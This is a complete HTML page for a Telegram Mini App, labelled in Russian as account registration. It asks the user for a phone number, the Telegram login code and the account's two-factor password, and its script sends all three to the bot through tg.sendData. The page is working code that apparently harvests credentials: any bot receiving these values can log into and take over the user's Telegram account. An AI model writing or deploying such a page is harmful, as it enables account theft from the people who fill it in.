<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Регистрация</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background: var(--tg-theme-bg-color, #101014);
      color: var(--tg-theme-text-color, #ffffff);
    }

    main {
      width: min(480px, 100%);
      margin: 0 auto;
      padding: 18px;
    }

    h1 {
      margin: 8px 0 18px;
      font-size: 22px;
      line-height: 1.2;
    }

    .panel {
      padding: 14px;
      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
      border-radius: 8px;
      background: var(--tg-theme-secondary-bg-color, #1b1b22);
      margin-bottom: 12px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: var(--tg-theme-hint-color, #a5a5ad);
      font-size: 13px;
    }

    input {
      width: 100%;
      height: 46px;
      padding: 0 12px;
      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
      border-radius: 8px;
      background: var(--tg-theme-bg-color, #101014);
      color: var(--tg-theme-text-color, #ffffff);
      font-size: 16px;
      outline: none;
    }

    input:focus {
      border-color: var(--tg-theme-button-color, #2ea6ff);
    }

    button {
      width: 100%;
      min-height: 46px;
      border: 0;
      border-radius: 8px;
      padding: 0 12px;
      background: var(--tg-theme-button-color, #2ea6ff);
      color: var(--tg-theme-button-text-color, #ffffff);
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
    }

    button.secondary {
      background: var(--tg-theme-secondary-bg-color, #24242c);
      color: var(--tg-theme-text-color, #ffffff);
      border: 1px solid var(--tg-theme-hint-color, #3a3a42);
    }

    .grid {
      display: grid;
      grid-template-columns: 1fr;
      gap: 10px;
    }

    .muted {
      margin-top: 8px;
      color: var(--tg-theme-hint-color, #a5a5ad);
      font-size: 13px;
      line-height: 1.35;
    }

    .status {
      display: none;
      margin: 12px 0;
      padding: 10px 12px;
      border-radius: 8px;
      background: rgba(46, 166, 255, 0.14);
      color: var(--tg-theme-text-color, #ffffff);
      font-size: 14px;
      line-height: 1.35;
    }

    .status.visible {
      display: block;
    }
  </style>
</head>
<body>
  <main>
    <h1>Регистрация аккаунта</h1>

    <div class="panel">
      <label for="phone">Номер телефона</label>
      <input id="phone" inputmode="tel" autocomplete="tel" placeholder="+998901234567">
      <div class="muted">Бот ответит результатом в чат Telegram.</div>
    </div>

    <div class="panel grid">
      <button id="send-phone">Запросить код</button>
      <button id="close" class="secondary">Закрыть</button>
    </div>

    <div class="panel">
      <label for="code">Код подтверждения</label>
      <input id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="12345" maxlength="8">
      <div class="grid" style="margin-top: 10px;">
        <button id="send-code">Отправить код</button>
        <button id="resend-code" class="secondary">Другой способ / повтор</button>
      </div>
    </div>

    <div class="panel">
      <label for="twofa">Пароль 2FA</label>
      <input id="twofa" type="password" autocomplete="current-password" placeholder="Если Telegram попросил пароль">
      <div class="grid" style="margin-top: 10px;">
        <button id="send-twofa">Отправить 2FA</button>
      </div>
    </div>

    <div id="status" class="status"></div>
  </main>

  <script>
    const tg = window.Telegram.WebApp;
    const phoneInput = document.getElementById("phone");
    const codeInput = document.getElementById("code");
    const twofaInput = document.getElementById("twofa");
    const statusBox = document.getElementById("status");

    tg.ready();
    tg.expand();

    phoneInput.value = localStorage.getItem("grinreg_phone") || "";

    function showStatus(text) {
      statusBox.textContent = text;
      statusBox.classList.add("visible");
    }

    function normalizePhone(value) {
      const trimmed = value.trim();
      if (trimmed.startsWith("+")) {
        return "+" + trimmed.replace(/\D/g, "");
      }
      return "+" + trimmed.replace(/\D/g, "");
    }

    function currentPhone() {
      const phone = normalizePhone(phoneInput.value);
      if (!/^\+\d{8,15}$/.test(phone)) {
        tg.showAlert("Введите номер с кодом страны, например +998901234567");
        return null;
      }
      localStorage.setItem("grinreg_phone", phone);
      phoneInput.value = phone;
      return phone;
    }

    function send(action, payload) {
      tg.sendData(JSON.stringify({ action, ...payload }));
    }

    document.getElementById("send-phone").addEventListener("click", () => {
      const phone = currentPhone();
      if (!phone) return;
      send("register_start", { phone });
      showStatus("Запрос отправлен. Ответ придёт сообщением от бота.");
    });

    document.getElementById("send-code").addEventListener("click", () => {
      const phone = currentPhone();
      const code = codeInput.value.replace(/\D/g, "");
      if (!phone) return;
      if (code.length < 5 || code.length > 8) {
        tg.showAlert("Код должен быть длиной 5-8 цифр");
        return;
      }
      send("submit_code", { phone, code });
      showStatus("Код отправлен боту. Проверьте ответ в чате.");
    });

    document.getElementById("resend-code").addEventListener("click", () => {
      const phone = currentPhone();
      if (!phone) return;
      send("resend_code", { phone });
      showStatus("Запрос повтора отправлен. Проверьте ответ в чате.");
    });

    document.getElementById("send-twofa").addEventListener("click", () => {
      const phone = currentPhone();
      const password = twofaInput.value.trim();
      if (!phone) return;
      if (!password) {
        tg.showAlert("Введите пароль 2FA");
        return;
      }
      send("submit_twofa", { phone, password });
      showStatus("Пароль отправлен боту. Проверьте ответ в чате.");
    });

    document.getElementById("close").addEventListener("click", () => {
      tg.close();
    });
  </script>
</body>
</html>
